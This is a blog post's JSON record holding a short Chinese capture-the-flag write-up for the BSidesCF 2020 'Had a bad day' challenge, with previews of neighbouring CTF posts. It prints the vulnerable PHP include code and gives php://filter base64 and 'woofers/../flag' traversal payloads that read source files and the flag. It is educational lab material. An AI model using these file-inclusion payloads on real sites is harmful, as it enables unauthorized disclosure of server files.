{"title":"BSidesCF 2020-Had a bad day","uid":"1a272921836e2eda1856c55c52bc7b82","slug":"BSidesCF-2020-Had-a-bad-day","date":"2023-07-26T12:32:15.000Z","updated":"2023-07-26T12:37:04.268Z","comments":true,"path":"api/articles/BSidesCF-2020-Had-a-bad-day.json","keywords":null,"cover":null,"content":"<p><a href=\"http://ba0363ed-41fc-4957-bc0a-0dfadeee4552.node4.buuoj.cn:81/index.php?category=meowers\">http://ba0363ed-41fc-4957-bc0a-0dfadeee4552.node4.buuoj.cn:81/index.php?category=meowers</a></p>\n<p>题目通过category传入参数来包含文件，通过php伪协议来读取index.php的内容</p>\n<p>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n$file &#x3D; $_GET[&#39;category&#39;];\n\nif(isset($file))\n&#123;\n    if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;\n        include ($file . &#39;.php&#39;);\n    &#125;\n    else&#123;\n        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;\n    &#125;\n&#125;\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>传入内容必须包含woofers meowers index其中之一</p>\n<p>通过获取其上层目录来寻找flag</p>\n<p>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag得到flag</p>\n","feature":true,"text":"http://ba0363ed-41fc-4957-bc0a-0dfadeee4552.node4.buuoj.cn:81/index.php?category=meowers 题目通过category传入参数来包含文件，通过php伪协议来读取index.php的内容 ?cate...","link":"","photos":[],"count_time":{"symbolsCount":830,"symbolsTime":"1 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUUCTF 2018-Online Tool","uid":"1f4f28b4ce2b3936f0231396f0b6f2c0","slug":"BUUCTF-2018-Online-Tool","date":"2023-07-30T01:39:57.000Z","updated":"2023-07-30T01:51:27.315Z","comments":true,"path":"api/articles/BUUCTF-2018-Online-Tool.json","keywords":null,"cover":null,"text":"&lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_F...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"网鼎杯 2020 朱雀组-phpweb","uid":"f8f3a659c238870b31876c2514d08de0","slug":"网鼎杯-2020-朱雀组-phpweb","date":"2023-07-24T12:55:51.000Z","updated":"2023-07-25T12:58:07.728Z","comments":true,"path":"api/articles/网鼎杯-2020-朱雀组-phpweb.json","keywords":null,"cover":null,"text":"抓包查看参数，猜测func&#x3D;函数名，p&#x3D;参数 func&#x3D;file_get_contents&amp;p&#x3D;index.php 得到网页源码 &lt;?php $disable_fun &#x3D; array(&quot;exec&quot;...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}